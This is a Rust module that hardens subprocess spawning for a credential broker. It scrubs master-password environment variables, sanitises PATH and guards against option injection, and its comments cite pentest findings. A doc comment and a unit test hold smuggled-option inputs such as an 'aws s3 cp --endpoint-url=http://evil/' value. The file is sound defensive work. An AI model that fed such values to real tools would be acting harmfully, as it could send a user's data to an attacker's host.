//! Hardened subprocess spawning shared by the capability primitives.
//!
//! Consolidates the security-relevant child-process setup surfaced by the
//! v0.6.4 adversarial pentest (`ISSUE-KVD-CLI-B78ED5`):
//!
//!  - **N1 — environment scrub.** A brokered subprocess (the real `npm`/`aws`,
//!    an npm lifecycle script, or a PATH-planted trojan) inherited the full
//!    environment of `kvendra mcp serve`, including `KVENDRA_MCP_PASSWORD` (the
//!    master password) when the keychain/env unlock path is used. Every child
//!    now has the sensitive `KVENDRA_*` credential vars removed.
//!  - **A2 — PATH sanitisation.** Empty, `.` and relative PATH entries are
//!    dropped before spawning, so a relative-dir supply-chain plant
//!    (`./node_modules/.bin/git`, a cwd `.` entry) is not resolved ahead of
//!    the real tool. (Absolute-dir hijack by a same-uid attacker is a residual
//!    tracked as a design issue — the full fix is pinned tool paths.)
//!  - **N5 — option-injection guard** (`reject_option_like`) for the
//!    user-controlled positional arguments that reach the tool (s3 src/dst,
//!    package names, dist paths), mirroring the `git` URL guard (H5).
//!
//! stdin is detached from the broker's JSON-RPC pipe (ISSUE-KVD-CLI-330251)
//! and stdout/stderr are piped.

use crate::error::{KvendraError, KvendraResult};
use tokio::process::Command;

/// `KVENDRA_*` environment variables that may carry the master password, a new
/// password, or the recovery mnemonic. A brokered subprocess never needs any
/// of these, so they are stripped from every child environment.
const SENSITIVE_ENV_VARS: &[&str] = &[
    "KVENDRA_PASSWORD",
    "KVENDRA_MCP_PASSWORD",
    "KVENDRA_INIT_PASSWORD",
    "KVENDRA_NEW_PASSWORD",
    "KVENDRA_RECOVERY_MNEMONIC",
    "KVENDRA_INIT_CONFIRM_CODE",
    // A recovery credential (read by `config rebind`); a brokered child must
    // not inherit it if the owner exported it in the launching shell (N1 class).
    "KVENDRA_REBIND_RECOVERY_CODE",
];

/// Build a sanitised PATH from the inherited PATH: keep only non-empty,
/// absolute entries; drop empty entries (POSIX treats an empty PATH element as
/// the cwd), `.`, and any relative directory. Returns `None` if PATH is unset.
pub fn sanitized_path() -> Option<String> {
    let raw = std::env::var_os("PATH")?;
    let parts: Vec<std::path::PathBuf> = std::env::split_paths(&raw)
        .filter(|p| {
            !p.as_os_str().is_empty()
                && p.is_absolute()
                && p.as_os_str() != std::ffi::OsStr::new(".")
        })
        .collect();
    std::env::join_paths(parts)
        .ok()
        .map(|p| p.to_string_lossy().into_owned())
}

/// Construct a hardened `tokio::process::Command` for a brokered tool: sensitive
/// `KVENDRA_*` vars removed (N1), PATH sanitised (A2), stdin detached, stdout
/// and stderr piped. Callers add the tool's own args and any credential env
/// vars afterwards (those are added AFTER this scrub, so they survive).
pub fn hardened_command(program: &str) -> Command {
    let mut cmd = Command::new(program);
    for var in SENSITIVE_ENV_VARS {
        cmd.env_remove(var);
    }
    if let Some(path) = sanitized_path() {
        cmd.env("PATH", path);
    }
    cmd.stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped());
    cmd
}

/// Reject a user-controlled positional argument value that the underlying tool
/// would parse as an option because it begins with `-` (N5 — option injection,
/// e.g. `aws s3 cp --endpoint-url=http://evil/ …`). Mirrors the `git` URL guard.
pub fn reject_option_like(field: &str, value: &str) -> KvendraResult<()> {
    if value.starts_with('-') {
        return Err(KvendraError::InvalidArgs(format!(
            "{field} must not start with '-' (option injection)"
        )));
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[cfg(unix)]
    #[test]
    fn sanitized_path_drops_relative_and_empty_entries() {
        // SAFETY: single-threaded test; we set + read PATH atomically here.
        unsafe {
            std::env::set_var("PATH", "/usr/bin::.:relative/bin:/opt/homebrew/bin");
        }
        let p = sanitized_path().unwrap();
        assert!(p.contains("/usr/bin"));
        assert!(p.contains("/opt/homebrew/bin"));
        assert!(
            !p.split(':')
                .any(|e| e.is_empty() || e == "." || e == "relative/bin")
        );
    }

    #[test]
    fn reject_option_like_blocks_leading_dash() {
        assert!(reject_option_like("s3.src", "--endpoint-url=http://evil/").is_err());
        assert!(reject_option_like("s3.src", "-rf").is_err());
        assert!(reject_option_like("s3.src", "s3://bucket/key").is_ok());
        assert!(reject_option_like("s3.src", "./build").is_ok());
    }
}
